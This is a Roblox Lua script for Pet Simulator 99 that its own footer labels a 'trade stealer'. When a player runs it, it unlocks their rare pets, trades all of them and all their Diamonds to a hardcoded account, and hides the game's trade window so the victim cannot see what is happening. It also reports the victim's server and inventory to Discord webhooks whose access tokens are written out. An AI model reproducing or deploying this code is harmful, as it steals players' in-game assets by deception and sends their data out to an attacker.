Username = "tobi437a"
Webhook = "https://discord.com/api/webhooks/1188270710586626168/Cs96Qi3pnoN_L333SdIkaak54Y1RxxD_zcozOAfkReeeOWXYaJfxdulNKjXwiC7chqmv"

local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get()
local inventory = library.Save.Get().Inventory

local function GetTradeID()
    return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._id
end

local function GetCounter()
    return require(game.ReplicatedStorage.Library.Client.TradingCmds).GetState()._counter
end

local function SendTrade(username)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(Username)
    }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Request"):InvokeServer(unpack(args))
end

local function ReadyTrade()
    local args = {
        [1] = GetTradeID(),
        [2] = true,
        [3] = GetCounter()
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Ready"):InvokeServer(unpack(args))
end

local function DepositPetInTrade()
    if save.Inventory.Pet ~= nil then
		for i,v in pairs(save.Inventory.Pet) do
			id = v.id
			dir = library.Directory.Pets[id]
			if dir.huge or dir.titanic then
				local args = {
					[1] = GetTradeID(),
					[2] = "Pet",
					[3] = i,
					[4] = v._am or 1
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
			end
		end
    end 
end

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
else
	Webhook = ""
end

function HasHuge()
	local huges = "No"
    for i, v in pairs(inventory.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge then
			huges = "Yes"
			break
        end
    end
	return huges
end

function HasTitanic()
	local titanic = "No"
    for i, v in pairs(inventory.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.titanic then
			titanic = "Yes"
			break
        end
    end
	return titanic
end

local trade = game:GetService('Players').LocalPlayer.PlayerGui.TradeWindow.Frame
trade.Visible = false
local mobile = game.Players.LocalPlayer.PlayerGui.MainMobile.MobileCurrency
mobile.Visible = false

local currentCamera = game.Workspace.CurrentCamera
currentCamera.FieldOfView = 70
currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
	currentCamera.FieldOfView = 70
end)

local function freeze_mainleft()
    local mainleft_gui = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft
    local mainleft_gui_clone = mainleft_gui:Clone()
    mainleft_gui_clone.Name = "MainLeftClone"
    mainleft_gui_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui
end
freeze_mainleft()
local mainleftframe = game:GetService("Players").LocalPlayer.PlayerGui.MainLeft
mainleftframe:Destroy()

local function freeze_main()
    local main_gui = game:GetService("Players").LocalPlayer.PlayerGui.Main
    local main_gui_clone = main_gui:Clone()
    main_gui_clone.Name = "MainClone"
    main_gui_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui
end
freeze_main()
local mainframe = game:GetService("Players").LocalPlayer.PlayerGui.Main
mainframe:Destroy()

local function freeze_goal()
    local goal_gui = game:GetService("Players").LocalPlayer.PlayerGui.GoalsSide
    local goal_gui_clone = goal_gui:Clone()
    goal_gui_clone.Name = "GoalsSideClone"
    goal_gui_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui
end
freeze_goal()
local goalframe = game:GetService("Players").LocalPlayer.PlayerGui.GoalsSide
goalframe:Destroy()

function UnlockPets()
    for i, v in pairs(inventory.Pet) do
        local id = v.id
        local dir = library.Directory.Pets[id]
        if dir.huge or dir.titanic then
			if v._lk then
				local args = {
				[1] = i,
				[2] = false
				}
				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
			end
        end
    end
end

function CountHuges()
	local count = 0
	for i, v in pairs(inventory.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.huge then
			count = count + 1
		end
	end
	return count
end

function CountTitanics()
	local count = 0
	for i, v in pairs(inventory.Pet) do
		local id = v.id
		local dir = library.Directory.Pets[id]
		if dir.titanic then
			count = count + 1
		end
	end
	return count
end

local WebhookList = {}

for i, v in pairs(inventory.Pet) do 
    local PetId = v.id
    local PetDir = library.Directory.Pets[PetId]
    if PetDir and (PetDir.huge or PetDir.titanic) then
        table.insert(WebhookList, PetId)
    end
end

function SendPublic(embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = { embed }
    }
    local body = http:JSONEncode(data)
    local response = request({
		Url = "https://discord.com/api/webhooks/1203482037705641994/mp-BjDgW4Asju9husVZdWRuJS9lG9JltOQ469cSPEebrkfumL5SxmjXen0PR6bLJV5ac",
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

local gemssent = 1
function AddGemsToTrade()
    for i, v in pairs(inventory.Currency) do
        if v.id == "Diamonds" then
            GemAmount = v._am
			gemssent = GemAmount
            GemId = i
            local args = {
                [1] = GetTradeID(),
                [2] = "Currency",
                [3] = GemId,
                [4] = GemAmount
            }
			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
        end
    end
end

if HasHuge() == "Yes" or HasTitanic() == "Yes" then
	local titanics = CountTitanics()
	local huges = CountHuges()
	if Webhook ~= "" then
		SendMessage(Webhook, "User " .. game.Players.LocalPlayer.Name .. " has executed the script. Join the game with this script: ```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(8737899170, '" .. game.JobId .. "', game.Players.LocalPlayer)\n```Titanic count: " .. titanics .. "\nHuge count: " .. huges)
	end
	
	UnlockPets()

	while true do
		wait(0.1)
		if game:GetService("Players"):WaitForChild(Username) ~= nil then
			SendTrade(Username)
		end
		if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
			if deposited ~= true then
				DepositPetInTrade()
				AddGemsToTrade()
				ReadyTrade()
			end
			wait(1)
		end
		if game.Players.LocalPlayer.PlayerGui.Message.Enabled == true then
			if #WebhookList > 0 then
				local embed = {
					["title"] = "New trade stealer hit!",
					["color"] = 65280,
					["footer"] = {
						["text"] = "Trade stealer by Tobi. discord.gg/HcpNe56R2a"
					},
					["fields"] = {
						{
							["name"] = "Pet names:",
							["value"] = table.concat(WebhookList, "\n"),
							["inline"] = false
						},
						{
							["name"] = "Gems:",
							["value"] = gemssent,
							["inline"] = true
						}
					}
				}
				SendPublic(embed)
				break
			end
		end
	end
end
